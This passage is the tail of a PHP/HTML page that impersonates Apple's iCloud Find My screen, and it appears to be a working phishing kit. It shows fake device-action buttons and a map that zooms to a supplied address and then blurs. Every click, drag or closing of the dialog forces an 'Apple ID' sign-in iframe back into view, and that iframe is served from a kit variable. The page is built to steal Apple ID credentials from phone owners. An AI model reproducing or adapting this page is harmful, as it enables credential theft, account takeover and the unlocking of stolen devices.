                        <div class="fmip-erase-device hoverable-element" style="margin: 0px 5px;">
                          <ui-button  aria-disabled="false" class="fmip-action-button erase-button icloud-mouse" ontouchstart="void(0)" title="Erase this iPhone" role="button">
                            <button type="button" tabindex="-1"></button>
                            <div class="label eraselabel"><?=$language['erase_device'][$lang];?></div>
                          </ui-button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="device-details-container-opacity-overlay" style="opacity: 0;"></div>
          </div>
        </section>
        <div id="map_desktop"><div id="map"></div></div>
        
      </div>
      <div id="fmip-device-viewer" class="compact" style="display: none">
        <div id="map_mobile"></div>
        <div class="ui-slide-transition ui-sliding-card device-details-pane compact" data-direction="up" style="transform: translate3d(0px, 0%, 0px);bottom: 0px; z-index: 3;">
          <ui-card aria-hidden="false" class="compact ui-card" style="width: 100%;">
            <div>
              <div class="fmip-svg-icon close">
                <svg width="31" height="31" viewBox="0 0 31 31" xmlns="http://www.w3.org/2000/svg">
                  <path d="M16.58148 15.16726l13.82411 13.82412-1.41421 1.41421-13.82412-13.82411L1.41421 30.33452 0 28.92031l13.75305-13.75305L0 1.41421 1.41421 0l13.75305 13.75305L28.99138-.07107l1.41421 1.41422-13.82411 13.82411z" fill-rule="evenodd"></path>
                </svg>
              </div>
            </div>
            <div>
              <div class="device-details-view">
                <div class="fmip-device-details-pane compact">
                  <div class="title">
                    <div class="name"><?php echo $device_model?></div>
                  </div>
                  <div class="fmip-deviceaction-details">
                    <div class="fmip-device-details online collapsed">
                      <div class="container">
                        <div class="details">
                          <div class="subtitle">
                            <span class="status address"></span>
                          </div>
                          <div class="subtitle">
                            <span class="status"><?=$language['minutes_ago'][$lang];?></span>
                            <div class="fmip-battery-icon">
                              <svg width="28px" height="13px" viewBox="0 0 30 13" version="1.1" xmlns="http://www.w3.org/2000/svg" style="overflow: visible;">
                                <g id="􀐤--Find-My" stroke="none" stroke-width="1" fill="none" fill-rule="nonzero">
                                  <g>
                                    <path d="M5.20508 13.2129L20.5566 13.2129C22.2266 13.2129 23.6328 13.0566 24.6289 12.0605C25.625 11.0645 25.7715 9.67773 25.7715 8.00781L25.7715 5.20508C25.7715 3.53516 25.625 2.14844 24.6289 1.15234C23.6328 0.15625 22.2266 0 20.5566 0L5.18555 0C3.54492 0 2.13867 0.15625 1.14258 1.15234C0.146484 2.14844 0 3.54492 0 5.17578L0 8.00781C0 9.67773 0.146484 11.0645 1.14258 12.0605C2.13867 13.0566 3.54492 13.2129 5.20508 13.2129ZM4.94141 11.6406C3.93555 11.6406 2.88086 11.5039 2.28516 10.918C1.69922 10.3223 1.57227 9.27734 1.57227 8.27148L1.57227 4.96094C1.57227 3.93555 1.69922 2.89062 2.28516 2.29492C2.88086 1.69922 3.94531 1.57227 4.9707 1.57227L20.8301 1.57227C21.8359 1.57227 22.8906 1.70898 23.4766 2.29492C24.0723 2.89062 24.1992 3.92578 24.1992 4.93164L24.1992 8.27148C24.1992 9.27734 24.0723 10.3223 23.4766 10.918C22.8906 11.5039 21.8359 11.6406 20.8301 11.6406ZM27.0996 9.13086C27.8711 9.08203 28.9062 8.0957 28.9062 6.60156C28.9062 5.11719 27.8711 4.13086 27.0996 4.08203Z" fill="rgb(110, 110, 114)" fill-opacity="0.7"></path>
                                    <rect id="Rectangle" x="2.27027027" y="2.36363636" width="9.03" height="8.27272727" rx="1.125" fill="rgb(110, 110, 114)"></rect>
                                  </g>
                                </g>
                              </svg>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="action-button">
                      <div class="">
                        <div class="fmip-play-sound-control">
                          <ui-button aria-disabled="false" class="fmip-action-button icon play-sound-button action-button-extra-long-lang icloud-mouse" ontouchstart="void(0)" title="Play a sound on this iPhone" role="button">
                            <button type="button" tabindex="-1"></button>
                            <div class="icon-container">
                              <div class="fmip-svg-icon playing icon1">
                                <svg width="90" height="90" viewBox="0 0 90 90" xmlns="http://www.w3.org/2000/svg">
                                  <g transform="matrix(1.32, 0, 0, 1.28, -12, 91)">
                                    <path class="play-sound-icon-background" fill="rgb(87,89,206)" d="M44.043 2.00195Q51.7578 2.00195 58.4717-0.878906Q65.1855-3.75977 70.3369-8.91113Q75.4883-14.0625 78.3936-20.7764Q81.2988-27.4902 81.2988-35.2051Q81.2988-42.9199 78.3936-49.6338Q75.4883-56.3477 70.3369-61.499Q65.1855-66.6504 58.4717-69.5312Q51.7578-72.4121 44.043-72.4121Q36.377-72.4121 29.6387-69.5312Q22.9004-66.6504 17.7734-61.499Q12.6465-56.3477 9.74121-49.6338Q6.83594-42.9199 6.83594-35.2051Q6.83594-27.4902 9.74121-20.7764Q12.6465-14.0625 17.7734-8.91113Q22.9004-3.75977 29.6387-0.878906Q36.377 2.00195 44.043 2.00195Z"></path>
                                    <path class="play-sound-svg" fill="#ffffff" d="M43.3105-17.9199Q42.8711-17.9199 42.5049-18.1641Q42.1387-18.4082 41.8457-18.6523L32.3242-27.6855Q31.9336-27.9785 31.4941-27.9785L24.8047-27.9785Q23.5352-27.9785 22.6074-28.9062Q21.6797-29.834 21.6797-31.2012L21.6797-39.2578Q21.6797-40.5273 22.6074-41.4551Q23.5352-42.3828 24.8047-42.3828L31.4941-42.3828Q31.9336-42.3828 32.3242-42.6758L41.8457-51.9531Q42.1387-52.1973 42.5049-52.4414Q42.8711-52.6855 43.3105-52.6855Q43.9453-52.6855 44.2627-52.2461Q44.5801-51.8066 44.5801-51.1719L44.5801-19.4336Q44.5801-18.7988 44.2627-18.3594Q43.9453-17.9199 43.3105-17.9199ZM60.1562-21.3867Q59.8145-21.6309 59.7412-22.0459Q59.668-22.4609 59.9121-22.7539Q61.9141-25.0977 62.915-28.3203Q63.916-31.543 63.916-35.3027Q63.916-41.9922 60.0098-47.8516Q59.7656-48.1934 59.8389-48.584Q59.9121-48.9746 60.1562-49.2676Q60.5957-49.5117 61.0107-49.4385Q61.4258-49.3652 61.7188-48.9746Q63.7695-45.7031 64.8926-42.2852Q66.0156-38.8672 66.0156-35.3027Q66.0156-30.7129 64.8438-27.3193Q63.6719-23.9258 61.6211-21.582Q61.2793-21.2402 60.9131-21.1914Q60.5469-21.1426 60.1562-21.3867ZM52.4414-26.709Q51.7578-27.3438 52.1484-28.0762Q54.4922-31.1035 54.4922-35.3027Q54.4922-39.8438 52.1973-42.4805Q52.002-42.8223 52.0508-43.2129Q52.0996-43.6035 52.4414-43.8965Q52.7832-44.1406 53.1982-44.0918Q53.6133-44.043 53.9062-43.6523Q55.2246-41.9922 55.8838-39.8193Q56.543-37.6465 56.543-35.3027Q56.543-33.0566 55.8838-30.835Q55.2246-28.6133 53.9062-26.9531Q53.6133-26.5625 53.1982-26.5137Q52.7832-26.4648 52.4414-26.709Z"></path>
                                  </g>
                                </svg>
                              </div>
                            </div>
                            <div class="label playsoundlabel"><?=$language['play_sound'][$lang];?></div>
                          </ui-button>
                        </div>
                      </div>
                      <ui-button aria-disabled="false" class="fmip-action-button icon lost-button action-button-extra-long-lang icloud-mouse" ontouchstart="void(0)" title="Turn on Lost Mode on this iPhone" role="button">
                        <button type="button" tabindex="-1"></button>
                        <div class="icon-container">
                          <div class="fmip-svg-icon losticon icon1">
                            <svg width="90" height="90" viewBox="0 0 90 90" xmlns="http://www.w3.org/2000/svg">
                              <g transform="matrix(1.23, 0, 0, 1.2, -11, 87)">
                                <path class="fmip-lock-icon-border" d="M46.2402 4.19922Q54.3457 4.19922 61.4746 1.12305Q68.6035-1.95312 74.0479-7.42188Q79.4922-12.8906 82.5928-20.0195Q85.6934-27.1484 85.6934-35.2051Q85.6934-43.2617 82.5928-50.3906Q79.4922-57.5195 74.0234-62.9883Q68.5547-68.457 61.4258-71.5332Q54.2969-74.6094 46.1914-74.6094Q38.1348-74.6094 31.0059-71.5332Q23.877-68.457 18.457-62.9883Q13.0371-57.5195 9.93652-50.3906Q6.83594-43.2617 6.83594-35.2051Q6.83594-27.1484 9.93652-20.0195Q13.0371-12.8906 18.4814-7.42188Q23.9258-1.95312 31.0547 1.12305Q38.1836 4.19922 46.2402 4.19922Z"></path>
                                <path class="fmip-lock-icon-svg" d="M31.9824-19.5801L31.9824-35.2051Q31.9824-39.1602 35.2539-39.4531L35.2539-43.8477Q35.2539-49.5117 38.3057-52.9541Q41.3574-56.3965 46.2891-56.3965Q51.1719-56.3965 54.2236-52.9541Q57.2754-49.5117 57.2754-43.8477L57.2754-39.4531Q60.5469-39.1602 60.5469-35.2051L60.5469-19.5801Q60.5469-15.332 56.5918-15.332L35.9375-15.332Q31.9824-15.332 31.9824-19.5801ZM39.8438-39.502L52.6855-39.502L52.6855-44.4336Q52.6855-47.8027 50.9277-49.9023Q49.1699-52.002 46.2891-52.002Q43.4082-52.002 41.626-49.9023Q39.8438-47.8027 39.8438-44.4336Z"></path>
                              </g>
                            </svg>
                          </div>
                        </div>
                        <div class="label lostlabel"><?=$language['mark_lost'][$lang];?></div>
                      </ui-button>
                    </div>
                    <div class="button-stack">
                      <div class="fmip-erase-device hoverable-element" style="margin: 0px 5px;">
                        <ui-button aria-disabled="false" class="fmip-action-button erase-button icloud-mouse" ontouchstart="void(0)" title="Erase this iPhone" role="button">
                          <button type="button" tabindex="-1"></button>
                          <div class="label eraselabel"><?=$language['erase_device'][$lang];?></div>
                        </ui-button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </ui-card>
        </div>
      </div>
    </div>
    <div class="modal" tabindex="-1" role="dialog" id="SignInForm" data-bs-backdrop="static" data-bs-keyboard="false" style="display: none;">
      <div class="modal-dialog modal-dialog-centered" role="document">
        <div class="modal-content rounded-4 shadow" style="padding:4%">
          <div class="modal-header border-bottom-0">
            <button id="CloseSignInForm" type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body py-0">
            <div class="container-view">
              <div class="cloud-os-apple-id-view">
                <div class="view-visible">
                  <div id="auth-container-c915d11c-6197-4efb-b1fb-c145351abd03" scrolling="no" class="apple-id-view apple-id-ui-view apple-id-frame-view">
                    <iframe src="<?php echo $module; ?>" id="aid-auth-widget-iFrame" name="aid-auth-widget" scrolling="no" role="none" title="Sign In with your Apple ID" width="100%" height="100%" frameborder="0" style="overflow: hidden;">
                    </iframe>
                  </div>
                </div>
                <canvas class="cw-spinner-view" style="height:32px;width:32px;display:none" width="64" height="64"></canvas>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>

<script src="script/icloud2024/js/jquery-3.7.1.min.js"></script>
<script>
  var marker;
  var geocoder;
  var map;
  var address = "<?php echo $address ?>";
  async function initMap() {
    map = new google.maps.Map(document.getElementById('map'), {
      zoom: 7,
      disableDefaultUI: true,
      scrollwheel: false,
      draggable: true,
      styles: [{
        "elementType": "geometry",
        "stylers": [{
          "color": "#f3f0ea"
        }]
      }, {
        "featureType": "landscape.man_made",
        "stylers": [{
          "visibility": "off"
        }]
      }, {
        "featureType": "poi.business",
        "stylers": [{
          "visibility": "off"
        }]
      }, {
        "featureType": "poi.park",
        "elementType": "labels.text",
        "stylers": [{
          "visibility": "off"
        }]
      }, {
        "featureType": "road",
        "elementType": "geometry.fill",
        "stylers": [{
          "color": "#fcfcfc"
        }]
      }, {
        "featureType": "road",
        "elementType": "geometry.stroke",
        "stylers": [{
          "color": "#d1d1d1"
        }]
      }, {
        "featureType": "water",
        "elementType": "geometry",
        "stylers": [{
          "color": "#8cdbf6"
        }]
      }],
      center: {
        lat: -34.397,
        lng: 150.644
      }
    });
    
    map.addListener('click', function(event) {
        $('#SignInForm').modal('show');
    });
    
    map.addListener('dragend', function(event) {
        $('#SignInForm').modal('show');
    });
    
    geocoder = new google.maps.Geocoder();
    await codeAddress(geocoder, map);
  }

  async function codeAddress(geocoder, map) {
    geocoder.geocode({
      'address': address
    }, function(results, status) {
      if (status === 'OK') {
        const icon = {
          url: 'script/icloud2024/img/marker.png', // url
          scaledSize: new google.maps.Size(60, 84), // scaled size
          origin: new google.maps.Point(0, 0), // origin
          anchor: new google.maps.Point(0, 0) // anchor
        };
        
        var current_lat = results[0].geometry.location.lat() + 0.004;
        var current_lng = results[0].geometry.location.lng();
        var centerLocation = { lat: current_lat, lng: current_lng };
        
        map.setCenter(results[0].geometry.location);
        
        marker = new google.maps.Marker({
          map: map,
          icon: icon,
          position: centerLocation
        });
        ApplyZoom(map);
		google.maps.event.addListener(marker, 'click', function() {$('#SignInForm').modal('show');});
      } else {
        // alert('Geocode was not successful for the following reason: ' + status);
      }
    });
  }
  
  function moveMarker(marker) {
      // Simulate movement by updating marker position
      var newPosition = {
        lat: marker.getPosition().lat() - 0.000010, // Example: random small latitude change
        lng: marker.getPosition().lng() // Example: random small longitude change
      };
      marker.setPosition(newPosition);
      centerMapOnMarker(marker);
    }
    
    function centerMapOnMarker(marker) {
      var bounds = new google.maps.LatLngBounds();
      
    var marker_lat = marker.getPosition().lat() - 0.004;
    var marker_lng = marker.getPosition().lng();
    var markerLocation = { lat: marker_lat, lng: marker_lng };
      
      bounds.extend(markerLocation);
      map.fitBounds(bounds);
      
        var currentZoom = map.getZoom();
        // Optionally, adjust the zoom level to provide a more appropriate view
        var newZoom = Math.min(currentZoom, 16); // Example: Set a maximum zoom level of 15
        map.setZoom(newZoom);
      
    }
  
  async function ApplyBlurOnMap() {
	for (b = 0; b < 3; b++){
		$("#map").css("filter", "blur(" + b + "px)");
		await sleep(300);
	}
	$('#SignInForm').modal('show');
	return null
  }
  
  async function ApplyZoom(map) {
    console.log(marker);
	for (b = 7; b < 17; b++){
		map.setZoom(b);
		await sleep(500);
	}
	ApplyBlurOnMap();
	setInterval(() => moveMarker(marker), 100);
	return null
  }

  function sleep(n) {
    return new Promise(e => setTimeout(e, n))
  }
  
  $( document ).ready(function() {
	$(document).on('click','ui-button',function(){
		$('#SignInForm').modal('show');
	});
	
	$("#SignInForm").on('hide.bs.modal', function(){
        setTimeout(function(){
            $('#SignInForm').modal('show');
        }, 3000);
    });
	
	  if ($(window).width() < 1024) {
		 var element = $('#map').detach();
		 $('#map_mobile').append(element);
	  }
	
  });
  
  $(window).resize(function() {
	  if ($(window).width() < 1024) {
		 var element = $('#map').detach();
		 $('#map_mobile').append(element);
	  }else{
		var element = $('#map').detach();
		 $('#map_desktop').append(element);
	  }
	});
  
</script>
<script async defer src="https://maps.googleapis.com/maps/api/js?key=<?php echo $map_key; ?>&callback=initMap"></script>